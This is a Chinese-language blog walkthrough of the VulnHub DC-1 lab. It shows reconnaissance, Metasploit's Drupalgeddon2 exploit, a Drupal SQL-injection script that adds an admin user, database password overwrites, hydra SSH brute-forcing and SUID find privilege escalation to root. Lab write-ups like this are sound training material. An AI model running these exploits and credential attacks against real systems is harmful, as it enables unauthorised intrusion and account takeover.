
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/DSchenzi/p/18847226" title="发布于 2025-04-25 19:24">
    <span role="heading" aria-level="2">[VulnHub]DC-1靶场全过程</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="dc-1">DC-1</h2>
<p>借鉴我们OnePanda-Sec团队的文章</p>
<p><a href="https://mp.weixin.qq.com/s/BbPkmDiZ-cRleiCqmj114w" target="_blank" rel="noopener nofollow">https://mp.weixin.qq.com/s/BbPkmDiZ-cRleiCqmj114w</a></p>
<h3 id="靶场搭建">靶场搭建</h3>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192314997-1226721918.png" alt="image-20250425164628697" loading="lazy"></p>
<p>先导入DC-1靶场，并将连接改为NAT模式</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192315509-778702871.png" alt="image-20250425164722939" loading="lazy"></p>
<h3 id="信息收集">信息收集</h3>
<p>先通过nmap -sP进行扫描主机网段信息</p>
<p><code>nmap -sP 192.168.190.0/24</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192315845-1483636916.png" alt="image-20250425165022705" loading="lazy"></p>
<p><code>arp-scan -l</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192316162-140229943.png" alt="image-20250425165154388" loading="lazy"></p>
<p>然后基本可以确定DC的IP了</p>
<pre><code>DC-1:192.168.190.137
kali:192.168.190.128
</code></pre>
<p>得到了ip地址就可以搜集系统类型了</p>
<p><code>nmap -A -T4 192.168.190.137</code></p>
<ul>
<li><strong>nmap</strong>：Network Mapper 的简称 ，是一款开源免费的网络发现和安全审计工具，可用于列举网络主机清单、检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等 。</li>
<li><strong>-A</strong>：表示使用进攻性方式扫描 。会启用操作系统检测（尝试识别目标主机的操作系统）、服务版本探测（识别开放端口上运行的服务及其版本号 ）和脚本扫描（调用 Nmap 脚本引擎 NSE 执行一系列脚本，进行更深入检测，如漏洞检测、后门扫描等 ）。</li>
<li><strong>-T4</strong>：指定扫描过程使用的时序。Nmap 的时序有 0 - 5 共 6 个级别，T4 属于较高速度级别，扫描速度较快 ，但也相对更容易被防火墙或入侵检测系统（IDS）检测并屏蔽，在网络通讯状况较好时推荐使用。</li>
<li><strong>192.168.190.137</strong>：是目标主机的 IP 地址，即此次扫描的对象 。</li>
</ul>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192316715-1771376390.png" alt="image-20250425165502449" loading="lazy"></p>
<p>我们大致可以看到端口以及服务信息</p>
<ul>
<li>
<p><strong>22/tcp</strong>：SSH 服务开启，使用 OpenSSH 6.0p1 Debian 4+deb7u7 版本 ，展示了 DSA、RSA、ECDSA 三种类型的主机密钥。</p>
</li>
<li>
<p><strong>80/tcp</strong>：HTTP 服务开启，Web 服务器是 Apache HTTPD 2.2.22 (Debian) 。<code>http - robots.txt</code> 禁止访问 15 个目录和文件，网页标题为 “Welcome to Drupal Site | Drupal Site” ，网页生成器为 Drupal 7。</p>
</li>
<li>
<p><strong>111/tcp</strong>：rpcbind 服务开启，版本为 2 - 4 (RPC #100000) ，还有相关的 rpcinfo 信息。</p>
</li>
<li>
<p><strong>MAC 地址</strong>：00:50:56:3F:73:32 ，设备类型推测为通用型，可能是 VMware 虚拟机。</p>
</li>
<li>
<p><strong>操作系统</strong>：推测为 Linux 3.2 - 3.16 版本 ，CPE（Common Platform Enumeration 通用平台枚举）标识为 <code>cpe:/o:linux:linux_kernel:3</code></p>
</li>
</ul>
<p>基本可以判断主机是开了网站的</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192317100-1938031949.png" alt="image-20250425165919097" loading="lazy"></p>
<p>​	当然，我们也可以通过kali自带的whatweb进行扫描，这个可以扫描出是什么CMS，也更加全面</p>
<p><code>whatweb -v 192.168.190.137</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192317458-1530060621.png" alt="image-20250425170141581" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192317803-1109813394.png" alt="image-20250425170203659" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192318151-322747258.png" alt="image-20250425170211409" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192318454-723328167.png" alt="image-20250425171858167" loading="lazy"></p>
<p>从上面我们可以知道</p>
<pre><code>Apache 2.2.22
PHP 5.4.45
Jquery 1.4.4
CMS Durpal 7
</code></pre>
<p>然后就是用dirsearch工具扫一下目录</p>
<p><code>dirsearch -u 192.168.190.137 -e *</code></p>
<p><code>*</code>表示扫描常见的所有文件拓展名，dirsearch如果没有安装，使用该命令时会提示你安装</p>
<p>如果在运行时报错</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192318802-1616590370.png" alt="image-20250425172047745" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192319101-1620651408.png" alt="image-20250425172143435" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192319451-1230168088.png" alt="image-20250425172339791" loading="lazy"></p>
<p>扫完后会发现有很多目录</p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>我们知道了CMS的类型和版本，就可以从cms的角度入手（这在实战中也非常常见，通过历史遗留漏洞成为突破口）</p>
<p>我们可以利用msfconsole查找</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192319823-637881312.png" alt="image-20250425172533378" loading="lazy"></p>
<p><code>search Drupal</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192320197-374408912.png" alt="image-20250425172710629" loading="lazy"></p>
<p>我们用18年的excellent的漏洞</p>
<p><code>use exploit/unix/webapp/drupal_drupalgeddon2</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192320591-424324197.png" alt="image-20250425172746893" loading="lazy"></p>
<p><code>show options</code>查看一下我们需要的参数，其中yes为必填项</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192320925-2064051676.png" alt="image-20250425172920367" loading="lazy"></p>
<p>先设置一下rhosts（设置为目标机器）</p>
<p><code>set rhosts 192.168.190.137</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192321283-883924245.png" alt="image-20250425173011924" loading="lazy"></p>
<p>设置完后我们可以再进行<code>show options</code>，养成一个好习惯，看看有没有设置成功。</p>
<p>然后直接<code>run</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192321591-797174206.png" alt="image-20250425173142312" loading="lazy"></p>
<p>当出现连接成功，就表示OK了</p>
<p>之后就是我们的后渗透了</p>
<p>先<code>shell</code>一下执行一下我们的linux的命令</p>
<p><code>ls</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192322042-590626810.png" alt="image-20250425173253655" loading="lazy"></p>
<p>可以看到存在flag1.txt</p>
<p><code>Every good CMS needs a config file - and so do you.</code></p>
<p>这句话翻译一下就是	每一个好的CMS都需要一个配置文件</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192322368-1962951207.png" alt="image-20250425173349287" loading="lazy"></p>
<p>find / -name settings.php</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192322695-430661442.png" alt="image-20250425173558842" loading="lazy"></p>
<p>cat /var/www/sites/default/settings.php</p>
<p>查看一下，获得flag2</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192323023-53313429.png" alt="image-20250425173642577" loading="lazy"></p>
<p>最重要的是我们得到了数据库的账号密码</p>
<p>并翻译一下flag2</p>
<p><code>暴力破解和字典攻击并非获取访问权限的唯一途径（而你确实需要获取访问权限 ）。拿到这些凭证后你能做些什么？</code></p>
<p>得到了数据库的账号密码，不妨登录试一下</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192323381-376385133.png" alt="image-20250425181219990" loading="lazy"></p>
<p>但发现一直卡着，因为shell无法直接交互数据库，需要在shell的情况下获得一个可以交互式的shell，当然需要有python环境的攻击机才行</p>
<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
<p><code>mysql -udbuser -pR0ck3t</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192323670-951558335.png" alt="image-20250425181656972" loading="lazy"></p>
<p><code>show databases</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192323972-2074201967.png" alt="image-20250425181729831" loading="lazy"></p>
<p><code>use drupaldb</code></p>
<p><code>show tables</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192324274-640693843.png" alt="image-20250425181830671" loading="lazy"></p>
<p>存在一个users表</p>
<p><code>select * from users</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192324672-2037449849.png" alt="image-20250425181937842" loading="lazy"></p>
<p>拿到密码了，但是发现根本爆破不出来，同样另外一个账户Fred也爆破不出来</p>
<p>解决这种无法爆破数据库中网站的密码，我们可以用其他方法</p>
<p>第一种：添加admin权限用户</p>
<p>先exit退回到msf页面</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192325061-282348028.png" alt="image-20250425182304231" loading="lazy"></p>
<p>因为在之前我们知道了Drupal的版本为7，可以利用漏洞查找工具searchsploit来查找drupal方面的一个SQL注入的漏洞，会发现很多个漏洞脚本可以使用</p>
<p><code>searchsploit drupal</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192325440-1234731921.png" alt="image-20250425182600303" loading="lazy"></p>
<p>我们看一下34992.py这个脚本，可以通过这个URL进行下载</p>
<p><code>searchsploit 34992.py -p</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192325809-2026716320.png" alt="image-20250425182734683" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192326183-1339891029.png" alt="image-20250425182812323" loading="lazy"></p>
<p>然后下载下来放到kali里</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192326572-1133964941.png" alt="image-20250425182937825" loading="lazy"></p>
<p><code>python2 34992.py</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192327149-907218182.png" alt="image-20250425183027079" loading="lazy"></p>
<p>这里需要我们加一下参数，目标URL网址，账号和密码</p>
<p><code>python2 34992.py -t http://192.168.190.137/ -u test -p test</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192327507-772514122.png" alt="image-20250425183203308" loading="lazy"></p>
<p>访问网站，输入账号密码，成功登录</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192327812-1576378427.png" alt="image-20250425183246331" loading="lazy"></p>
<p>第二种方法：修改admin的密码</p>
<p>在进行之前，先run一下进入shell，并加入python交互性</p>
<p>在drupal里面，会自动给网站的密码进行加密</p>
<p><code>/var/www/scripts/password-hash.sh</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192328170-125127911.png" alt="image-20250425183534662" loading="lazy"></p>
<p>而且可以加参数</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192328514-28061758.png" alt="image-20250425183640868" loading="lazy"></p>
<p>得到这一串加密密码后，先登录数据库</p>
<p><code>mysql -udbuser -pR0ck3t</code></p>
<p>然后进行替换密码</p>
<p><code>use drupaldb;update users set pass = "$S$DYyGW7gbUhpGleULFWyeDmGwNxS6ygReItLe6J16hbW/noY/BEXf" where name = 'admin' or name = 'Fred';</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192328969-515986917.png" alt="image-20250425184232980" loading="lazy"></p>
<p>这样就已经改了，我们也可以尝试一下爆破（因为这算是一个弱口令了）</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192329376-668696420.png" alt="image-20250425185926526" loading="lazy"></p>
<p>然后尝试登录一下 admin/test123 可以登录成功</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192329665-24152410.png" alt="image-20250425190029627" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192329949-362965202.png" alt="image-20250425190139693" loading="lazy"></p>
<p>找到flag3</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192330310-1566703894.png" alt="image-20250425190212543" loading="lazy"></p>
<p>我们查看一下/etc/passwd，发现flag4</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192330645-1877024868.png" alt="image-20250425190347142" loading="lazy"></p>
<p>但是我们需要登录这个用户才可以查看</p>
<p>要登陆这个用户，需要获得密码，一个是爆破，一个是看shadow文件查看密码，会发现并没有shadow权限，因为这个需要root权限</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192330948-1890032699.png" alt="image-20250425190457752" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192331214-1796498836.png" alt="image-20250425190536707" loading="lazy"></p>
<p>第一种方法是使用hydra对这个flag4进行爆破，使用rockyou这个密码本</p>
<p><code>hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.190.137</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192331594-1264030891.png" alt="image-20250425190816024" loading="lazy"></p>
<p>得到密码	orange</p>
<p><code>ssh flag4@192.168.190.137</code></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192331926-820055563.png" alt="image-20250425190918595" loading="lazy"></p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192332222-1724605874.png" alt="image-20250425190935131" loading="lazy"></p>
<p>然后回归到第二种方法就是提权，得到root权限，可以用SUID提权，需要利用find命令，查找具有SUID权限的可执行二进制文件</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<ul>
<li><strong>find</strong>：是 Linux 系统下用于查找文件和目录的命令 ，可根据文件名、文件类型、文件权限等多种条件在指定路径下进行搜索。</li>
<li><strong>/</strong>：表示查找的起始路径为根目录，即从整个系统磁盘的根位置开始搜索。</li>
<li>-perm -u=s：
<ul>
<li><strong>-perm</strong>：是按文件权限查找的选项 。</li>
<li><strong>-u=s</strong> ：这里 <code>u</code> 代表文件所有者（user ），<code>s</code> 代表设置了 SUID（Set - User - ID ）权限 。<code>-u=s</code> 表示查找设置了 SUID 权限的文件，拥有 SUID 权限的文件在执行时，会以文件所有者的权限来运行，而非执行用户本身权限。</li>
</ul>
</li>
<li><strong>-type f</strong> ：<strong>-type</strong> 用于指定查找文件的类型，<code>f</code> 表示只查找普通文件，不包括目录、设备文件等其他类型文件 。</li>
<li>2&gt;/dev/null：
<ul>
<li><strong>2</strong>：代表标准错误输出（stderr ）的文件描述符 。</li>
<li><strong>&gt;</strong>：是输出重定向符号 。</li>
<li><strong>/dev/null</strong> ：是一个特殊文件，被称为 “黑洞” 设备，所有写入它的数据都会被丢弃。<code>2&gt;/dev/null</code> 意思是将命令执行过程中产生的错误信息重定向到 <code>/dev/null</code> ，即不显示错误输出 。</li>
</ul>
</li>
</ul>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192332556-693803620.png" alt="image-20250425191419457" loading="lazy"></p>
<p>find比较好用，可以通过find执行root的权限查找文件，会发现获取了root的权限</p>
<p><code>find / -name index.php -exec "/bin/sh" \;</code></p>
<ul>
<li><strong>-name index.php</strong>：<code>-name</code> 是按文件名查找的选项，<code>index.php</code> 是要查找的文件名，即查找名为 <code>index.php</code> 的文件 。</li>
<li>-exec "/bin/sh" ;：
<ul>
<li><strong>-exec</strong>：表示对找到的文件执行指定的 shell 命令 。</li>
<li><strong>"/bin/sh"</strong>：是要执行的命令，<code>/bin/sh</code> 是系统的 Shell 解释器，这里表示执行一个 Shell 。但该命令存在严重问题，正常使用 <code>-exec</code> 时，需要用 <code>{}</code> 作为占位符来代表找到的文件，此处缺少，会导致不是对找到的 <code>index.php</code> 文件执行操作，而是不管是否找到文件都会尝试执行 <code>/bin/sh</code> 。</li>
<li><strong>;</strong>：是命令的结束标识，<code>\</code> 是为了转义，防止 Shell 将 <code>;</code> 当作命令分隔符提前处理 。</li>
</ul>
</li>
</ul>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192332895-1307755838.png" alt="image-20250425191756799" loading="lazy"></p>
<p>发现已经提权成功</p>
<p><img src="https://img2023.cnblogs.com/blog/3588329/202504/3588329-20250425192333243-2011901798.png" alt="image-20250425191943382" loading="lazy"></p>
<p>获得最终flag</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.2054339005613426" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-04-25 19:24">2025-04-25 19:24</span>&nbsp;
<a href="https://www.cnblogs.com/DSchenzi">dynasty_chenzi</a>&nbsp;
阅读(<span id="post_view_count">20</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18847226);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18847226', targetLink: 'https://www.cnblogs.com/DSchenzi/p/18847226', title: '[VulnHub]DC-1靶场全过程' })">举报</a>
</div>
        